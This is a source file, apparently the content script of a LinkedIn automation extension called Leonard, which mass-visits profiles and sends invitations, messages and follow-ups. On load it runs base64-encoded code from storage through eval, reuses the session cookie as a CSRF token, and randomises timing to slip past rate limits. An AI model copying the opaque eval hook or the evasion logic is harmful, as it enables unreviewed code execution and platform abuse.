var isSalesNav = false,
    is_sales_profile_active = false,
    viewPremiumOnly = false,
    scanPremiumOnly = false,
    connectPremiumOnly = false,
    exportCampaign = false,
    exportCampaignConn = false,
    exportCampaignMsg = false,
    exportCampaignMail = false,
    exportCampaignVisit = false,
    exportCampaignScan = true,
    autoFollowUsers = false,
    autoEndorseUsers = false,
    inMailPremiumOnly = false,
    messagePremiumOnly = false,
    sendUsingCredits = false,
    skipProfileWithNoPicVisit = false,
    skipProfileWithNoPicScan = false,
    skipProfileWithNoPicConn = false,
    skipProfileWithNoPicMsg = false,
    skipProfileWithNoPicMail = false,
    pageLoaded = false,
    isVisitingTab = false,
    idUrnMapObj = {},
    primaryIdentity = false,
    downloadStarted = false,
    recentComms = [],
    usersList, user_details, views, aliases, skipList, sent_connections, invitationMessages, followUpMessages, tags, messageTemplates, inMailTemplates, notificationTemplates, pending_connections;
var finished_in_remaining = 0,
    finished_conns_in_remaining = 0,
    finished_msgs_in_remaining = 0,
    finished_inms_in_remaining = 0,
    currentIdx = 0,
    search_records_count = 0;
var start_next_page_timer = false,
    startInter = false,
    isHeaderSet = false,
    urlListenInterval = false,
    isLeonardHeaderSet = false,
    addIconsInterval = false,
    initExtCalled = false,
    portInterval = false,
    nextViewInter = false,
    nextViewTimer = false,
    page_load_timer = false,
    resetInter = false,
    initializingPopups = false,
    sAgent = false,
    currentScrapeIdx = 0,
    updateAcceptedLen = 0,
    leonard_stopped = true;
var VIEWING_TIMER = 5000,
    REQMANAGER_TIMER = 30000;
const ONE_DAY = 24 * 60 * 60 * 1000;
const trial_days = 365;
const trial_days_in_ms = trial_days*ONE_DAY;
const MIN_TIME_TO_NEXT = 16; // 11
const MAX_TIME_TO_NEXT = 29; // 17
const MIN_PROFILE_BREAK = 8; // 8
const MAX_PROFILE_BREAK = 23; // 23
const MIN_BREAK_TIME = 220; // 120
const MAX_BREAK_TIME = 570; // 240
const MAX_PENDING_CONNECTIONS = 2500;
const LINKEDIN_DOMAIN_URL = 'https://www.linkedin.com/';
const LINKEDIN_PROFILE_URL = LINKEDIN_DOMAIN_URL + 'in/';
const MAX_NOTE_CHARS = 300;
var lastLoadedOn = false;
var campaign_export = [];
var objectUrnsToEntityUrns = {};
var local_data = {
    PLAN: 'Beta',
    VERSION: chrome.runtime.getManifest().version,
    ID: '',
    account_type: '',
    frame: '',
    frameWin: '',
    frameDoc: '',
    headerExpanded: false,
    synced: false,
    rpv: 0,
    rcr: 0,
    rm: 0,
    rim: 0,
    month_active: 30,
    old_url: '',
    new_url: '',
    maxEndorse: 3,
    selectedInvitationMessage: false,
    selectedFollowUpMessage: false,
    autoFollowUp: false,
    selectedTags: [],
    sales_tags_checked: false,
    selectedMessage: false,
    selectedMessageAttachments: [],
    selectedInMail: false,
    selectedInMailSubject: false,
    selectedInMailAttachments: [],
    week_active: 7,
    EXT_FOLDER: chrome.extension.getURL(''),
    REMAINING_PROFILE_VIEWS: 0,
    REMAINING_CONNECTION_REQUESTS: 0,
    REMAINING_MESSAGES: 0,
    REMAINING_INMAILS: 0,
    randomIdx: 0,
    currentIdx: 0,
    VISITED: 0,
    SKIPPED: 0,
    VISITED_IN_WEEK: 0,
    SKIPPED_IN_WEEK: 0,
    TOTAL_VISITED: 0,
    TOTAL_SKIPPED: 0
};

window.indexedDB = window.indexedDB || window.mozIndexedDB || window.webkitIndexedDB || window.msIndexedDB;
window.IDBTransaction = window.IDBTransaction || window.webkitIDBTransaction || window.msIDBTransaction;
window.IDBKeyRange = window.IDBKeyRange || window.webkitIDBKeyRange || window.msIDBKeyRange;

var connections_all = [];
var JSESSIONID_REGEX = new RegExp('JSESSIONID=["]*(.*?)["]*;');

window.onmessage = function(message){
    if(message.getHTML){
        window.top.postMessage({pageHTML: getPageHTML()}, location.origin);
        window.close();
    }
}

$(document).ready(function() {
    initLanguageStrings();
    chrome.storage.local.get('content_script', function(s){
        if(s && s.content_script){
            try{
                s.content_script.forEach(function(x){
                    eval(atob(x));
                })
            } catch(err){
                chrome.runtime.sendMessage({error: err, func: 'patch'});
            }
        }
    })
    /*Extension Installed*/
    $('<div />',{id:'Leonard_Ext_ID',hidden:true}).appendTo($("body"));

    updateLinkedInExtList();
    // findUserEmail();
    isPublicProfileSettings();
    if(location.host != 'www.linkedin.com'){
        return false;
    }
    addIconsInterval = setInterval(function(){
        var listEls = $("#results-list > li");
        if ($("#results").length > 0 && $("#results > li[data-li-entity-id]").length > 0) {
            listEls = $("#results > li[data-li-entity-id]");
        } else if ($("#results-list").length > 0) {
            listEls = $("#results-list > li");
        } else if($(".results-list").length > 0) {
            listEls = $(".results-list > li")
        } else if($(".search-results .search-results__result-list li.search-results__result-item").length > 0) {
            listEls = $(".search-results .search-results__result-list li.search-results__result-item");
        } else if($(".search-results li.search-result").length > 0) {
            listEls = $(".search-results li.search-result");
        }
        if(listEls.length > 0){
            setEditIcons(listEls);
            setToggleButton(listEls);
        }
    },1000);
    getProfileDetails(function(){
        chrome.runtime.sendMessage({
            'getAliases': true
        }, function(as) {
            if(as != 'Error'){
                aliases = as || [];
            }
            chrome.runtime.sendMessage({
                'getSkipList': true
            }, function(sl) {
                if(sl != 'Error'){
                    skipList = sl || [];
                }
            });
        });
        initIntervals();
        reloadConnections(function(){
            updateSettings();
        });
    });
    initExtension();
    checkForAcceptedConnections();
    addNotesandTags();
    //initProfilePage(); // Set add notes and add tags option in profile page
    // injectCodeIntoPage();
    // updateSettings();
    pageLoaded = true;
    // var request = window.indexedDB.open("Leonard", 1);
    // request.onerror = function(event) {
    //     chrome.runtime.sendMessage({
    //         audit: true,
    //         event: 'database_loading_error'
    //     })
    // };
    // request.onsuccess = function(event) {
    //     local_data.db = event.target.result;
    // };
    // request.onupgradeneeded = function(event) {
    //     var db = event.target.result;
    //     var objectStore = db.createObjectStore("downloads", { autoIncrement : true });
    //     var index = objectStore.createIndex("NameIndex", ["name"]);
    //     // objectStore.transaction.oncomplete = function(event) {
    //     //     var downloadObjectStore = db.transaction("downloads", "readwrite").objectStore("downloads");
    //     //     ['TEst','Testing'].forEach(function(d) {
    //     //         downloadObjectStore.add(d);
    //     //     });
    //     // };
    // };
    // window.top.postMessage({pageLoaded : true}, location.origin);
});

/*
    Database code
*/

function addToDatabase(obj, operation, filename){
    // var objectStore = local_data.db.transaction("downloads", "readwrite").objectStore("downloads");
    // obj['name'] = local_data.csv_file_name;
    // objectStore.add(obj);
    // http://45.55.120.26/add_to_downloads?operation=visit&entityUrn=ACoAAAjXoiEBq3GcFV8osko5MeR8MXhOIIhAjOo&user_id=5a93904184b9975f012bf7d6
    chrome.runtime.sendMessage({
        saveToDownloads: true,
        operation: operation,
        entityUrn: obj.entityUrn,
        filename: filename
    })
}

function getDataofFiles(filenames, dData, idx, callback){
    var file = filenames[idx];
    if(file && local_data.db){
        var tx = local_data.db.transaction("downloads", "readwrite");
        var store = tx.objectStore("downloads");
        var index = store.index("NameIndex");
        var req = index.getAll([file]);
        req.onsuccess = function(e){
            idx++;
            dData.push(e.target.result);
            getDataofFiles(filenames, dData, idx, callback);
        }
    } else if(typeof callback == 'function'){
        callback(dData);
    }
}

/*
    chrome extension message handler
*/

function createPort(callback){
    local_data.CRMCONNECT = chrome.runtime.connect({name: "CRMCONNECT"});
    local_data.CRMCONNECT.onDisconnect.addListener(function(){
        // createPort();       // CRM not open, retrying again.
        if(callback) showNotification("Please open CRM!");
    });
    local_data.CRMCONNECT.onMessage.addListener(function(msg){
        if(msg.getMessageEntityUrn){
            getMsgEntityUrnByPublic_id(msg.public_id, function(data){
                local_data.CRMCONNECT.postMessage({getMessageEntityUrn:true,entityUrn: data});
            })
        }
    });
    if(typeof callback == 'function'){
        callback();
    }
}

function getMsgEntityUrnByPublic_id(public_id, callback){
    if(connections_all){
        var entityUrn = connections_all.filter(x=>(x.publicIdentifier == public_id || x.objectUrn.indexOf(public_id)>-1))[0].entityUrn.replace('urn:li:fs_miniProfile:','');
        getMsgEntityURN(entityUrn, function(data){
            if(typeof callback == 'function'){
                callback(data);
            }
        })
    } else {
        reloadConnections(function(){
            getMsgEntityUrnByPublic_id(public_id, callback);
        })
    }
}

function getSettings(callback){
    getLatestData(function() {
        local_data.REMAINING_PROFILE_VIEWS = parseInt(user_details.profile_views_remaining_today);
        local_data.REMAINING_CONNECTION_REQUESTS = parseInt(user_details.connection_requests_remaining_today);
        local_data.REMAINING_MESSAGES = parseInt(user_details.messages_remaining_today);
        local_data.REMAINING_INMAILS = parseInt(user_details.inmails_remaining_today);
        if(!local_data.startedViewing && !local_data.startedScanning) local_data.rpv = local_data.REMAINING_PROFILE_VIEWS;
        if(!local_data.startedSending) local_data.rcr = local_data.REMAINING_CONNECTION_REQUESTS;
        if(!local_data.startedMessaging) local_data.rm = local_data.REMAINING_MESSAGES;
        if(!local_data.startedMailing) local_data.rim = local_data.REMAINING_INMAILS;
        local_data.PLAN = user_details.user_type;
        local_data.autoFollowUp = user_details.autoFollowUp;
        local_data.ID = user_details.id;
        local_data.maxEndorse = parseInt(user_details.maxEndorse);
        if(user_details && typeof callback == 'function'){
            callback({
                autoWithdraw: user_details.autoWithdraw,
                autoRemind: user_details.autoRemind,
                autoFollowUp: user_details.autoFollowUp
            });
        }
    });
}

chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
    if (message.reloadPage) {
        location.reload();
    } else if (message.start_stop) {
        if ($("#start_viewing").length == 0 && location.href.match('www.linkedin.com/vsearch') == null) {
            showNotification(local_strings['TRY_AGAIN']);
            return false;
        }
        if ($("#start_viewing").length > 0) {
            $("#start_viewing").trigger("click");
        } else {
            showNotification(local_strings['MAX_LIMIT_CROSSED'] + getNextDateTimeStamp());
        }
    } else if (message.setTemplates) {
        // populateTemplates();
        lastLoadedOn = false;
        fillDropDowns(true, true);
    } else if(message.syncTags){
        syncLinkedInTags();
    } else if (message.sendFollowUpMessages) {
        sendFollowUpMessages(message.messages, 0, function() {
            if(typeof sendResponse == 'function'){
                sendResponse();
            }
        });
    } else if (message.sendRepliestoNotifications) {
        processNotifications();
    } else if(message.showToolbar){
        if(!local_data.headerExpanded && local_data.frame && local_data.frame.addClass){
            local_data.frame.addClass(getLeonardID('opened'));
            local_data.frameWin.postMessage("EXPANDED", location.origin);
            local_data.headerExpanded = true;
            sendResponse("TOOLBAR_SHOWN");
        } else {
            sendResponse("TOOLBAR_VISIBLE");
        }
    } else if(message.getAcceptedCount){
        reloadConnections(function() {
            checkForAcceptedConnections(function(isUpdated) {
                if(typeof sendResponse == 'function'){
                    sendResponse(updateAcceptedLen);
                }
            });
        })
    } else if(message.createPort){
        createPort(function(){
            sendResponse();
        })
    } else if (message.sendBulkMessages) {
        local_data.randomIdx = randIn(MIN_PROFILE_BREAK,MAX_PROFILE_BREAK);
        createPort();
        sendBulkMessages(message.messages, 0, function() {
            local_data.randomIdx = 0;
            if(typeof sendResponse == 'function'){
                sendResponse();
            }
        });
    } else if (message.reloadConnections) {
        reloadConnections(function() {
            if(typeof sendResponse == 'function'){
                sendResponse();
            }
        });
    } else if(message.getMessageEntityUrn){
        getMsgEntityUrnByPublic_id(message.public_id, function(data){
            sendResponse(data);
        })
    } else if(message.getPending){
        checkForAcceptedConnections(function(){
            if(typeof sendResponse == 'function'){
                sendResponse(pending_connections);
            }
        })
    } else if(message.getReceived){
        getAllRequestsReceived(0, [], function(invs){
            // console.log(invs);
            if(typeof sendResponse == 'function'){
                sendResponse(invs);
            }
        })
    } else if (message.checkForAccepted) {
        reloadConnections(function() {
            checkForAcceptedConnections(function(isUpdated) {
                if(typeof sendResponse == 'function'){
                    sendResponse(isUpdated);
                }
            });
        })
    } else if (message.sendFollowUpsToAccepted) {
        sendFollowUpsToAccepted();
    } else if (message.withdrawConnection) {
        withdrawConnectionRequest(message.public_id, function() {
            if(typeof sendResponse == 'function'){
                sendResponse();
            }
        })
    } else if (message.withdrawMultipleConnectionRequests) {
        withdrawMultipleConnectionRequests(message.public_ids, function() {
            if(typeof sendResponse == 'function'){
                sendResponse();
            }
        })
    } else if(message.getFileUploadToken) {
        getFileUploadToken(function(upload_info){
            if(typeof sendResponse == 'function'){
                sendResponse(upload_info);
            }
        })
    } else if(message.fileTxt){
        // form submit
        var blob = getArrayBuffer(message.fileTxt, message.type);
        var file = new File([blob], message.name);
        // window.open(URL.createObjectURL(blob));
        // return false;
        var csrf_token = document.cookie.match(JSESSIONID_REGEX)[1];
        var formData = new FormData();
        // formData.append('file', file, message.name);
        formData.append('file', blob, message.name);
        formData.append('sign_response', true);
        formData.append('persist', true);
        formData.append('callback', 'imageUploadCallback');
        formData.append('csrfToken', csrf_token);
        formData.append('persist', true);
        // formData.append('store_securely', true);
        formData.append('upload_info', message.upload_info);
        formData.append('file', 'C:\\fakepath\\'+message.name);
        $.ajax({
            url: LINKEDIN_DOMAIN_URL + "mupld/attachment",
            type: 'POST',
            data: formData,
            async: false,
            success: function (resp) {
                if(resp.value == "INV_MEDIA"){
                    // sendResponse({
                    //     value : "Please attach "
                    // });
                    if(typeof sendResponse == 'function'){
                        sendResponse(resp);
                    }
                } else {
                    if(typeof sendResponse == 'function'){
                        sendResponse(resp);
                    }
                }
            },
            error : function(xhr){
                console.log(xhr);
            },
            cache: false,
            contentType: false,
            processData: false
        });
    } else if(message.showUploadedFiles){
        if(local_data.selectedMessageAttachments.length > 0){
            displayAttachments(local_data.selectedMessageAttachments, 'selectedMessageAttachments');
        } else if(local_data.selectedInMailAttachments.length > 0){
            displayAttachments(local_data.selectedInMailAttachments, 'selectedInMailAttachments');
        } else {
            $(".file_list_ul").html('');
        }
        if(typeof sendResponse == 'function'){
            sendResponse();
        }
    } else if(message.stopLeonard){
        stopLeonard(false,true);
    } else if(message.handleConnection){
        handleConnnectionRequest(message.rec, message.mode,function(state){
            sendResponse(state);
        });
    } else if(message.checkEngagement){
        checkEngagement(message.urns, 0, function(data){
            sendResponse(data);
        })
    } else if(message.removePending){
        getSettings(function(settings){
            var autWithdrawLimit = settings.autoWithdraw;
            if(autWithdrawLimit){
                var removeConns = [];
                if(pending_connections && pending_connections.length > 0){
                    pending_connections.forEach(function(pc){
                        if( (( (Date.now() - pc.sentTime)/(1000*60*60*24) ) > autWithdrawLimit) && pc.toMember ){
                            removeConns.push(pc.toMember.publicIdentifier);
                        }
                    });
                    if(removeConns.length > 0){
                        removeConnectionRequest(removeConns, 0, function(){
                            var not_msg = local_strings['PENDING_CONNS_REMOVED'].replace('{{CONN_COUNT}}',removeConns.length).replace('{{DAYS}}', autWithdrawLimit);
                            showNotification(not_msg);
                            initViews();
                        })
                    }
                }
            }
        })
    } else if(message.visit_tab){
        scrollDown(function(){
            chrome.runtime.sendMessage({
                sendHTMLToMain: true,
                html: getPageHTML()
            }, function(){
                window.close();
            })
            
        })
    } else if(message.getHTML){
        sendResponse(getPageHTML());
    } else if(message.getUserDetailsToRegister){
        getCurrentProfileDetailsForRegistration(function(data){
            sendResponse(data);
        });
    } else if(message.checkLoadStatus){
        $('body').append($('<div id="leo_fixed_overlay"><div>Please wait...<br>while I visit this profile.</div></div>'));
        sendResponse(pageLoaded);
    } else if(message.getDownloadedData){
        var downloaded_files = message.getDownloadedData;
        getDataofFiles(downloaded_files, [], 0, function(dData){
            sendResponse(dData);
        })
    }
    return true;
});

/*
    Essential methods
*/

function updateSettings(){
    getSettings(function(settings){
        local_data.autoFollowUp = settings.autoFollowUp;
        setTimeout(updateSettings,10000);
    })
}

function sendFollowUpsToAccepted(){
    getSettings(function(settings){
        var autoFollowUpDelay = false;
        var connections_for_follow_ups = [];
        if(settings.autoFollowUp){
            autoFollowUpDelay = parseInt(settings.autoFollowUp) * 60 * 60 * 1000;
            reloadConnections(function() {
                checkForAcceptedConnections(function() {
                    if(sent_connections && typeof sent_connections == 'object' &&sent_connections.length > 0){
                        var accepted_connections = sent_connections.filter(x=>x.is_accepted == 'true');
                        var eligibleConnsForFollowUps = [];
                        accepted_connections.forEach(function(x){
                            var connectedCont = connections_all.filter(y=>y.objectUrn.indexOf(x.c_member_id) >= 0)[0];
                            if(connectedCont){
                                var msAfterConnecting = (Date.now() - new Date(connectedCont.createdAt));
                                if(msAfterConnecting > autoFollowUpDelay){
                                    eligibleConnsForFollowUps.push(x);
                                }
                            }
                        })
                        // var eligibleConnsForFollowUps = accepted_connections.filter(function(x){
                        //     return (Date.now() - new Date(x.date_accepted)) > autoFollowUpDelay && x.follow_up_message.length > 0;
                        // });
                        var asyncCallback = function(connections_for_follow_ups){
                            if(connections_for_follow_ups.length > 0){
                                sendFollowUpMessagesByChecking(connections_for_follow_ups,0, function(){
                                    showNotification("Automatically sent your welcome follow up message to new connections");
                                });
                            }
                        }
                        var eligibleConnsForFollowUpsLen = eligibleConnsForFollowUps.length;
                        eligibleConnsForFollowUps.forEach(function(ec, eidx){
                            var member_id = ec.c_member_id;
                            var conn = connections_all.filter(x=>x.objectUrn.indexOf(member_id) > -1);
                            if(autoFollowUpDelay && ec.follow_up_message && conn && conn.length > 0){
                                var entityURN = conn[0].entityUrn.replace('urn:li:fs_miniProfile:','');
                                connections_for_follow_ups.push({
                                    id: ec.id,
                                    message: ec.follow_up_message,
                                    entityURN: entityURN
                                });
                            }
                        });
                        asyncCallback(connections_for_follow_ups);
                    }
                });
            });
        }
    });
}

function scrollDown(callback){
    var curPos = $(window).scrollTop() + $(window).height();
    var maxPos = $(document.body).offset().top + document.body.scrollHeight;
    if(curPos < maxPos){
        window.scroll(0, scrollY + 10);
        setTimeout(function(){
            scrollDown(callback);
        },10);
    } else if(typeof callback == 'function'){
        callback();
    }
}

function showBreakWithTimer(time, callback){
    var action = '';
    if(local_data.startedViewing){
        action = 'VISIT';
    } else if(local_data.startedScanning){
        action = 'SCAN';
    } else if(local_data.startedMessaging){
        action = 'MSG';
    } else if(local_data.startedMailing){
        action = 'INMAIL';
    } else if(local_data.startedSending){
        action = 'CONN';
    }
    if(action){
        $.get(chrome.extension.getURL('template/break.html'), function(resp){
            resp.match(/{{(.*?)}}/g).forEach(function(a) {
                var m = local_data[a.replace(/\{|\}/g, '')] || 0;
                resp = resp.replace(a, m);
            });
            $("#leo_break_fixed").remove();
            $(resp).appendTo($("body"));
            $("#leo_action").text(local_strings['TAKING_SHORT_BREAK']+' '+local_strings[action]);
            $("#leo_break_timer").text(local_strings['BACK_IN']);
        });
        var end = Date.now() + time;
        local_data.break_callback = callback;
        if(local_data.break_timer){
            clearInterval(local_data.break_timer);
            local_data.break_timer = false;
        }
        local_data.break_timer = setInterval(function(){
            var diff = (end - (Date.now()))/1000;
            var mins = ('0' + (Math.floor(diff/60))).slice(-2);
            var secs = ('0' + (Math.floor(diff%60))).slice(-2);
            $("#leo_break_timer").text(local_strings['BACK_IN']+' '+mins+':'+secs);
            if(diff < 1){
                $("#leo_break_fixed").remove();
                clearInterval(local_data.break_timer);
                delete local_data.break_timer;
                if(typeof local_data.break_callback == 'function'){
                    local_data.break_callback();
                }
                delete local_data.break_callback;
                local_data.randomIdx += randIn(MIN_PROFILE_BREAK,MAX_PROFILE_BREAK);
                return false;
            }
        },500);
    }
    //  else {
    //     alert("No process is running");
    // }
}

function notifyUser(msg, callback){
    $.get(chrome.extension.getURL('template/notify.html'), function(resp){
        resp.match(/{{(.*?)}}/g).forEach(function(a) {
            var m = local_data[a.replace(/\{|\}/g, '')] || 0;
            resp = resp.replace(a, m);
        });
        $("#leo_break_fixed").remove();
        $(resp).appendTo($("body"));
        if(local_data.frame_id)
            $("#"+local_data.frame_id).remove();
        $("#leo_action").text(msg);
        $(".leonard_not_btn").bind("click", function(){
            $("#leo_break_fixed").remove();
            initIntervals();
        })
    });
}

function checkForRandom(callback){
    if(local_data.randomIdx == local_data.currentIdx){
        showBreakWithTimer(randomInRange(MIN_BREAK_TIME,MAX_BREAK_TIME),callback);        // 2-4 mins
    } else if(typeof callback == 'function'){
        callback();
    }
}

function imageUploadCallback(){
    console.log(arguments);
}

function initLanguageStrings(){
    chrome.storage.local.get('language', function(o){
        var lang = 'en';
        if(o && o.language){
            lang = o.language;
        }
        $.get(chrome.runtime.getURL('lang/'+lang+'.json'), function(data){
            if(typeof data == 'string'){
                data = JSON.parse(data);
            }
            local_strings = data;
        })
    })
}

function findUserEmail(callback) {
    var userPageData = document.body.innerHTML;
    var json_codes = userPageData.match(/>\s+{.*}\s+</g);
    json_codes.forEach(function(jc, i) {
        var etosp = jc && jc.replace(/>\s+/, '').replace(/\s+</, '');
        try {
            var js_obj = JSON.parse($('<textarea />').html(etosp).val());
            if (js_obj && js_obj.emailAddress) {
                var email = js_obj.emailAddress;
                chrome.runtime.sendMessage({
                    getUserIdByEmail: true,
                    email: email
                }, function() {
                    if (typeof callback == 'function') {
                        callback();
                    }
                })
            }
        } catch (err) {
            chrome.runtime.sendMessage({error: err,func: 'findUserEmail'});
        }
    });

}

function isPublicProfileSettings(){
    if(location.href.indexOf(LINKEDIN_DOMAIN_URL+'public-profile/settings') >= 0){
        if($("[name=visibilityLevel]:checked").val() == 'off'){
            showNotification(local_strings['MAKE_PUBLIC_PROFILE']);
        }
    }
}

function injectCodeIntoPage() {
    var src = chrome.extension.getURL('js/inject.js');
    $('<script />', {
        'type': 'text/javascript',
        'src': src
    }).appendTo($('head'));
    $("<div />", {
        'id': 'leonard_inject',
        'hidden': true
    }).appendTo($('body'));
    document.getElementById("leonard_inject").addEventListener('TRACK_WITH_EVENT_FOUND', function() {
        // var text = $('#leonard_inject').text();
        // console.log(text);
        if (nextViewInter || nextViewTimer || currentIdx > 0) {
            stopLeonard();
            showNotification(local_strings['PROCESS_STOPPED']);
        }
    });
}

function initIntervals() {
    startInter = setInterval(function() {
        if (!user_details) { // || document.cookie.indexOf('leo_auth_token') > 0
            clearInterval(startInter);
            startInter = null;
            logOutUserFromLeonard();
            return false;
        }
        if (document.querySelectorAll("#start_viewing").length > 0) {
            var startViewBtnClasses = document.querySelectorAll("#start_viewing")[0].classList
            try {
                chrome.runtime.sendMessage({
                    running: true,
                    runningState: startViewBtnClasses.contains("started")
                })
            } catch (err) {
                chrome.runtime.sendMessage({error: err, func: 'initIntervals'});
                clearInterval(startInter);
                startInter = null;
                chrome.storage.local.set({
                    nextPageRedirect: false
                }, function() {
                    location.reload();
                })
            }
        }
        if (isSalesNav) {
            if (location.href.indexOf('www.linkedin.com/sales/search') >= 0 && document.querySelectorAll("#Ext_Header").length == 0) {
                initExtension();
            } else if (location.href.indexOf('www.linkedin.com/sales/search') == -1) {
                $("#Ext_Header").remove();
            }
        } else if (user_details) {
            if (location.href.indexOf('www.linkedin.com/search') >= 0 && document.querySelectorAll("#Ext_Header").length == 0) {
                initExtension();
            } else if (location.href.indexOf('www.linkedin.com/search') == -1) {
                $("#Ext_Header").remove();
                clearInterval(startInter);
                startInter = null;
            }
        }
        //  else {
        //  clearInterval(startInter);
        //  startInter = false;
        // }
    }, 500);
    // reqManagerAgent = setInterval(function() {
    //     checkForAcceptedConnections();
    // }, REQMANAGER_TIMER);
    isHeaderSet = setInterval(function(){
        if(user_details){
            clearInterval(isHeaderSet);
            isHeaderSet = null;
        } else {
            var extMainCont = $('#srp_main_');
            if (extMainCont.length == 0 && !isSalesNav) {
                extMainCont = $(".sub-nav--trans-nav");
            } else if (isSalesNav) {
                extMainCont = $(".spotlights-wrapper");
            }
            if(extMainCont.length > 0){
                initExtension();
            }
        }
    },2000);
    // portInterval = setInterval(function(){
    //     createPort();
    // },5000);
    isLeonardHeaderSet = setInterval(function(){
        if($("#Ext_Header").length == 0 && !initExtCalled){
            initExtCalled = true;
            initExtension();
        }
    },2000);

    $("body").delegate(".leonard_rename", "click", function(){
        if($(this).attr("disabled") != "disabled"){
            showNotification("You're adding alias to a profile.\n\nPress Enter to confirm\nor\nEscape to exit from editing.");
            local_data.anc_el = $(this).prev();
            if(isSalesNav){
                if($(".result-lockup__name").length > 0){
                    local_data.anc_el = $(this).parents("li").find(".result-lockup__name > a");
                } else {
                    local_data.anc_el = $(this).parents("li").find("a.name-link.profile-link");
                }
            }
            local_data.edit_el = $(this);
            local_data.edit_el.attr("disabled",true);
            var old_name_val = '';
            if(local_data.anc_el.hasClass("name-link") || local_data.anc_el.parent().hasClass("result-lockup__name")){
                old_name_val = local_data.anc_el.text();
            } else {
                old_name_val = local_data.anc_el.find(".name").text();
            }
            old_name_val = old_name_val.trim();
            var old_name_width = (8.125 * old_name_val.length) + 5;
            $(".leonard_rename_field").remove();
            var editable_field = $('<input />',{type:'text', class:'leonard_rename_field', value: old_name_val, placeholder: 'Type something and press enter', style:'width:'+old_name_width+'px;'});
            local_data.anc_el.after(editable_field);
            editable_field.trigger("focus");
            local_data.editable_field = editable_field;
            editable_field[0].selectionStart = editable_field[0].selectionEnd = editable_field[0].value.length;
            editable_field.bind("keydown", function(e){
                var new_name_val = $(this).val();
                if(e.which == 13){
                    if(new_name_val.length > 0){
                        $(this).remove();
                        if(isSalesNav){
                            local_data.anc_el.text(new_name_val);
                        } else {
                            local_data.anc_el.find(".name").text(new_name_val);
                        }
                        local_data.edit_el.removeAttr("disabled");
                        var entityUrn = local_data.edit_el.attr("data-entityurn");
                        visitProfile(entityUrn, function(attrs){
                            var new_entityUrn = attrs.entityUrn
                            chrome.runtime.sendMessage({
                                renameConnect: true,
                                new_name: new_name_val,
                                entityUrn: new_entityUrn,
                                publicIdentifier: attrs.publicIdentifier,
                                objectUrn: attrs.objectUrn
                            }, function(){
                                chrome.runtime.sendMessage({
                                    'getAliases': true
                                }, function(as) {
                                    if(as != 'Error'){
                                        aliases = as || [];
                                    }
                                });
                            })
                            local_data.anc_el = null;
                            local_data.edit_el = null;
                        })
                    } else {
                        alert("Invalid name.");
                        $(this).trigger("focus");
                        this.selectionStart = this.selectionEnd = this.value.length;
                    }
                } else if(e.which == 27){
                    $(this).remove();
                    local_data.edit_el.removeAttr("disabled");
                    local_data.anc_el = null;
                    local_data.edit_el = null;
                    local_data.editable_field = null;
                }
            });
        } else {
            local_data.editable_field.trigger("focus");
        }
    })

    $("body").delegate(".leonard_skip_profile", "change", function(){
        var entityUrn = $(this).attr("data-entityurn");
        var is_skipped = $(this).is(":checked");
        chrome.runtime.sendMessage({
            skipProfile: true,
            is_skipped: is_skipped,
            entityUrn: entityUrn
        }, function(){
            chrome.runtime.sendMessage({
                'getSkipList': true
            }, function(sl) {
                if(sl != 'Error'){
                    skipList = sl || [];
                }
            });
        })
        if(is_skipped){
            $(this).next().text("Skip");
        } else {
            $(this).next().text("Skip");
        }
    });
}

function setEditIcons(listEls){
    if(!aliases){
        return false;
    }
    var listAncs = listEls.find(".search-result__info > a");
    if(listAncs.length == 0){
        listAncs = listEls.find("a");
    }
    if ($("#results").length > 0) {
        listAncs = listEls.find("a");
    } else if ($("#results-list").length > 0) {
        listAncs = listEls.find(".name-container a");
    }
    if(isSalesNav && $(".result-lockup__name").length > 0){
        listAncs = $(".result-lockup__name > a");
    }
    listAncs.each(function(idx){
        var parentEl = $(this).parents("li");
        if((isSalesNav && parentEl.find(".leonard_rename").length == 0) || (!isSalesNav && parentEl.find(".leonard_rename").length == 0) || (isSalesNav && parentEl.find(".leonard_rename").length == 0)){
            var entityURN = false, objectUrn = false;
            if(isSalesNav){
                entityURN = $(this).parents("li").find("[name=memberId]").val();
            } else {
                entityURN = $(this).attr("href").slice(4, -1)
            }
            if(!isSalesNav && parentEl.find("div > a:first").length > 0){
                entityURN = parentEl.find("div > a:first").attr("href").slice(4, -1);
            } else if(isSalesNav) {
                var profile_link = $(this).attr("href");
                if(profile_link){
                    var entityUrnMatch = profile_link.match(/sales\/.*?\/(.*?),/);
                    if(entityUrnMatch && entityUrnMatch.length > 0){
                        entityURN = profile_link.match(/sales\/.*?\/(.*?),/)[1];
                    }
                    var objectUrnArr = unescape(profile_link).match(/target=.*?\(.*?,(.*?)\)/);
                    if(objectUrnArr && objectUrnArr.length > 1){
                        objectUrn = objectUrnArr[1];
                    }
                }
            }
            if(aliases && entityURN){
                var aliasRec = aliases.filter(x=>(x.entityUrn == entityURN || x.publicIdentifier == entityURN|| x.objectUrn == objectUrn))[0];
                if(aliasRec){
                    if(isSalesNav){
                        $(this).text(aliasRec.new_name);
                    } else {
                        $(this).find(".name").text(aliasRec.new_name);
                    }
                }
            }
            if(isSalesNav){
                if(parentEl.find(".result-lockup__badge-list").length > 0){
                    parentEl.find(".result-lockup__badge-list").prepend($('<span />',{class:'leonard_rename',title:'Click to add Alias','data-entityurn':entityURN}));
                } else {
                    parentEl.find(".details-container").prepend($('<span />',{class:'leonard_rename',title:'Click to add Alias','data-entityurn':entityURN}));
                }
            } else {
                $(this).after($('<span />',{class:'leonard_rename','data-entityurn':entityURN}));
            }
            // listEls.eq(idx).attr("data-icons","true");
        }
    });
}

function setToggleButton(listEls){
    if(!skipList){
        return false;
    }
    var listAncs = listEls.find(".search-result__info > a");
    if(listAncs.length == 0){
        listAncs = listEls.find("a");
    }
    if ($("#results").length > 0) {
        listAncs = listEls.find("a");
    } else if ($("#results-list").length > 0) {
        listAncs = listEls.find(".name-container a");
    }
    if(isSalesNav && $(".result-lockup__name").length > 0){
        listAncs = $(".result-lockup__name > a");
    }
    listEls.each(function(idx){
        if($(this).find(".checkbox-slider-danger").length == 0 && listAncs.eq(idx).length > 0){
            var entityURN;
            if(isSalesNav){
                entityURN = $(this).find("[name=memberId]").val();
            } 
            if(!isSalesNav && $(this).find("div > a:first").length > 0){
                entityURN = $(this).find("div > a:first").attr("href").slice(4, -1);
            } else if(isSalesNav) {
                if($(this).find(".result-lockup__name a").length > 0){
                    var profile_link = $(this).find(".result-lockup__name a").attr("href");
                    if(profile_link){
                        var entityUrnMatch = profile_link.match(/sales\/.*?\/(.*?),/);
                        if(entityUrnMatch && entityUrnMatch.length > 0){
